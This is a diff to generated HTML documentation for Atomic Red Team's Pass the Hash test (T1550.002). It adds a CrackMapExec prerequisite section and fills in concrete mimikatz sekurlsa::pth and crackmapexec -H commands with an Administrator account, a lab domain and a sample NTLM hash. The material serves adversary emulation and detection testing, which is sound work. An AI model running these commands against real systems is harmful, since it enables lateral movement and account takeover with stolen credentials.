@@ -931,6 +931,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-crackmapexec-executor-must-exist-on-disk-at-specified-location-crackmapexec-exe">
+         Description: CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -980,7 +1008,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mimikatz # sekurlsa::pth /user:Administrator /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -996,9 +1024,36 @@
 <h3>Atomic Test #2 - crackmapexec Pass the Hash<a class="headerlink" href="#atomic-test-2-crackmapexec-pass-the-hash" title="Permalink to this headline">¶</a></h3>
 <p>command execute with crackmapexec</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-crackmapexec-executor-must-exist-on-disk-at-specified-location-crackmapexec-exe">
+<h5>Description: CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})<a class="headerlink" href="#description-crackmapexec-executor-must-exist-on-disk-at-specified-location-crackmapexec-exe" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>if(Test-Path C:\CrackMapExecWin\crackmapexec.exe) { 0 } else { -1 }
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: C:\CrackMapExecWin\crackmapexec.exe
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1550</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>crackmapexec atomic.local -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami
 </pre></div>
 </div>
 <div class="cell docutils container">
